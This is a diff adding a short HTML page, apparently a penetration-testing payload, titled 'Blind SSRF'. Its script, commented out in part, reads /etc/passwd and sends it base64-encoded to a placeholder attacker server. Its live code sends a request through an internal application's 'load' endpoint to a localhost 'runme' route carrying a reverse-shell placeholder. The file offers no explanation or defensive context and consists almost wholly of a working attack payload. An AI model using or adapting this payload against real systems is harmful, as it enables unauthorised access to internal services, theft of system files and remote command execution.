@@ -1,0 +1,24 @@
+<html>
+    <body>
+        <b>Blind SSRF</b>
+        <script>
+        // var readfile = new XMLHttpRequest(); // Read the local file
+        // var exfil = new XMLHttpRequest(); // Send the file to our server
+        // readfile.open("GET","file:///etc/passwd", true);
+        // readfile.send();
+        // readfile.onload = function() {
+        //     if (readfile.readyState === 4) {
+        //         var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
+        //         exfil.open("GET", url, true);
+        //         exfil.send();
+        //     }
+        // }
+        // readfile.onerror = function(){document.write('<a>Oops!</a>');}
+        // or
+        var http = new XMLHttpRequest();
+        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x={YOUR REVERSE SHELL}", true);
+        http.send();
+        http.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+     </body>
+</html>
